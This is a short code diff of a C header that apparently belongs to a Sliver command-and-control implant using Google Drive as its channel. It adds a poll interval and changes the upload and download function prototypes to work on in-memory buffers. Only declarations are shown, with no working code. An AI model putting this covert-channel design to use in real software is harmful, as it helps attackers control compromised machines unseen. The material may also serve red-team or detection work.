@@ -23,6 +23,7 @@ typedef struct _SLIVER_DRIVE_CLIENT {
 	UINT64 uEncoderNonce;
 	DWORD dwMaxErrors;
 	LPSTR lpServerMinisignPublicKey;
+	DWORD dwPollInterval;
 	BOOL IsClosed;
 } SLIVER_DRIVE_CLIENT, * PSLIVER_DRIVE_CLIENT;
 
@@ -39,10 +40,12 @@ BOOL RefreshAccessToken
 	PDRIVE_CONFIG This
 );
 
-BOOL GoogleDriveUpload
+BOOL DriveUpload
 (
 	_In_ PDRIVE_CONFIG This,
-	_In_ LPWSTR lpFilePath
+	_In_ PBYTE pData,
+	_In_ DWORD cbData,
+	_In_ LPSTR lpName
 );
 
 BOOL GetFileId
@@ -52,7 +55,7 @@ BOOL GetFileId
 	_Out_ LPSTR* pId
 );
 
-PBYTE GoogleDriveDownload
+PBYTE DriveDownload
 (
 	_In_ PDRIVE_CONFIG This,
 	_In_ LPSTR lpFileId,
